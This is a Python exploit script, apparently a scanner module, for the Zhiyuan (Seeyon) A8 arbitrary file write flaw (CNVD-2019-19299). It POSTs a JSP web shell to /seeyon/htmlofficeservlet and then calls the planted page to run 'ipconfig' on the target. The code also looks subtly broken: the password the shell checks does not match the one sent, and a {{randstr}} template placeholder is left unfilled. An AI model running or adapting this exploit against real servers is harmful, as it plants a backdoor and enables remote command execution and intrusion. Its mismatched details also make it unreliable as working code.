import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Zhiyuan A8 Arbitrary File Write (RCE)''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://www.cxyzjd.com/article/guangying177/110177339", 
            "https://github.com/sectestt/CNVD-2019-19299"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["zhiyuan", "cnvd", "cnvd2019", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/seeyon/htmlofficeservlet"""
        method = "POST"
        data = """DBSTEP V3. 0 343 0 658 DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
= WUghPB3szB3Xwg66 the CREATEDATE
recordID = qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId = wV66
originalCreateDate = wUghPB3szB3Xwg66
FILENAME = qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdb4o5nHzs
needReadFile = yRWZdAS6
originalCreateDate IZ = 66 = = wLSGP4oEzLKAz4
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder ();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine( )) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString() ;} %><%if("x".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("{{randstr}}"))){out.println("<pre>" +excuteCmd(request.getParameter("{{randstr}}")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce"""
        headers = {'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'Upgrade-Insecure-Requests': '1', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q =0.8,application/signed-exchange;v=b3', 'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8', 'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/seeyon/test123456.jsp?pwd=asasd3344&{{randstr}}=ipconfig"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if resp0.status_code == 200 and "htmoffice operate" in resp0.text and "Windows IP" in resp1.text:
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url